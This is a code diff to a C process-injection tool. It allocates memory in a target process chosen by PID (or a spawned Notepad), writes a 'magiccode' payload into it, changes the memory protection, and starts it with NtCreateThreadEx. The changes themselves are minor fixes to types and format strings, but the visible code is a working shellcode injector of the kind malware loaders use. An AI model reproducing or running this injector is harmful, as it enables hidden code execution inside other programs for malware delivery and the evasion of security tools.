@@ -22,7 +22,7 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
     ULONG oldProtect = 0;
     
     // Allocation of memory for the magiccode in the target process
-    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status == 0) {
         printf("[+] Memory allocated for magiccode\n");
     } else {
@@ -40,7 +40,7 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
     // }
 
     // Writing the magiccode to the allocated memory in the target process
-    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)magiccode, magiccodeSize, NULL);
+    status = NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)magiccode, (ULONG)magiccodeSize, NULL);
     if (status == 0) {
         printf("[+] magiccode written to memory\n");
     } else {
@@ -55,10 +55,6 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
     } else {
         printf("[-] Failed to change memory protection back\n");
     }
-    
-
-    //####END####
-
     
     // Creating a thread in the target process to execute the magiccode
     status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
@@ -116,7 +112,8 @@ int main(int argc, char *argv[])
     //check if pid is provided as argument: 
     if (argc > 1) {
         pid = atoi(argv[1]);
-        printf("[+] PID provided: %d\n", pid);
+        printf("[+] PID provided: %lu\n", (unsigned long)pid);
+
         // get pi information from pid:
         pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
@@ -137,7 +134,8 @@ int main(int argc, char *argv[])
         }
         printf("Notepad started with default settings.\n");
         pid = pi.dwProcessId;  
-        printf("[+] notepad PID: %d\n", pid);      
+        printf("[+] notepad PID: %lu\n", (unsigned long)pid);
+  
     }
 
 
